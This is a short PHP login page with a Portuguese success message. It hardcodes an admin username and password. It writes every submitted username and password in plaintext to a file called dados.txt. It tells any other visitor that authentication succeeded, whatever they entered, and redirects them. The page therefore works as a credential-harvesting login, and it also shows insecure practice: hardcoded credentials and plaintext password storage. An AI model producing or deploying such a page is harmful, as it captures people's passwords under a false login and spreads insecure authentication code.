<!DOCTYPE html>
<center>
<meta charset="utf-8">
<?php
session_start();
include ("menu.php");
$admin_username ="admin";
$admin_password = "admin123";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $us = $_POST['user'];
  $ps = $_POST['password'];
  $perfil = $us;

if ($us == "admin" && $ps == "admin123") {
    $_SESSION['admin'] = true;
    header("Location: admin.php");
    $dados = "Username: $us\nPassword: $ps\n";
    file_put_contents("dados.txt", $dados, FILE_APPEND);    
    exit();
} else {
    $_SESSION['user'] = $us;
    setcookie ($us, $us, time()+60);
    header("Refresh:2; url=main.php");
    echo "<center><span style='color: white;'>Autenticação correta</span></center>";
    $dados = "Username: $us\nPassword: $ps\n";
    file_put_contents("dados.txt", $dados, FILE_APPEND);
    exit();
}
}
?>